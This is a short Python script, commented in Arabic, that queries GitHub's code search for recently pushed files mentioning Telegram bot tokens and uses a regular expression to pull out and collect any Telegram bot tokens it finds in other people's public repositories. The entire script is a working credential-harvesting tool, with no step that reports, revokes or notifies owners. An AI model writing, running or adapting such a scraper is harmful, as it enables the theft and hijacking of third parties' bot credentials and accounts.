import re
import os
from github import Github

def search_for_tokens():
    # جلب التوكن من المتغيرات البيئية (كما كنت تفعل سابقاً)
    token = os.getenv('GITHUB_TOKEN')
    if not token:
        return []
        
    g = Github(token)
    found_tokens = []
    
    # قائمة استعلامات بحث شاملة ومحدثة
    queries = [
        'bot_token language:python pushed:>2026-06-20',
        'telebot language:python pushed:>2026-06-20',
        'telegram api_key language:python pushed:>2026-06-20',
        'BOT_TOKEN= language:python pushed:>2026-06-20',
        'token extension:json pushed:>2026-06-20'
    ]
    
    for query in queries:
        try:
            # البحث في الكود مع ترتيب حسب الأحدث
            results = g.search_code(query=query, sort='indexed', order='desc')
            
            # جلب أفضل 10 نتائج لكل استعلام
            for file in results[:10]:
                try:
                    content = file.decoded_content.decode('utf-8')
                    # نمط ريجكس دقيق لتوكنات التيليجرام
                    matches = re.findall(r'[0-9]{8,15}:[a-zA-Z0-9_-]{35}', content)
                    for token in matches:
                        if token not in found_tokens:
                            found_tokens.append(token)
                except:
                    continue
        except Exception:
            continue
            
    return found_tokens
